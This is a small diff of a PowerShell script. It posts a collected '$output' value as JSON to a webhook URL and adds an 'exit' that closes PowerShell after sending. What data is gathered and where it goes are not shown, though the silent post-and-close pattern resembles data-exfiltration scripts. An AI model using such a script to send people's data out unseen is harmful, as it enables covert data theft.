@@ -95,3 +95,6 @@ if($output.Length -gt $maxLen) {
     $body = @{ content = $output } | ConvertTo-Json
     Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
 }
+
+# Auto-close PowerShell after sending
+exit
